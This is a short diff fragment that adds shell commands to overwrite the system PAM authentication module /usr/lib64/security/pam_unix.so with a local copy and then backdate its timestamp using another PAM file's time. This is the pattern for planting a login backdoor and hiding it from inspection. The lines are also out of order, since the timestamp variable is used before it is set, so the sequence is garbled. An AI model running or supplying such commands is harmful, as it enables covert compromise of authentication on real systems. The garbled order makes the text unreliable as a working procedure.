@@ -1,0 +1,5 @@
+-rwxr-xr-x. root root system_u:object_r:lib_t:s0       /usr/lib64/security/pam_unix.so
+
+touch -d "$oldtime" /usr/lib64/security/pam_unix.so
+cp pam_unix.so /usr/lib64/security/pam_unix.so
+oldtime=`stat -c '%z' /usr/lib64/security/pam_ftp.so`
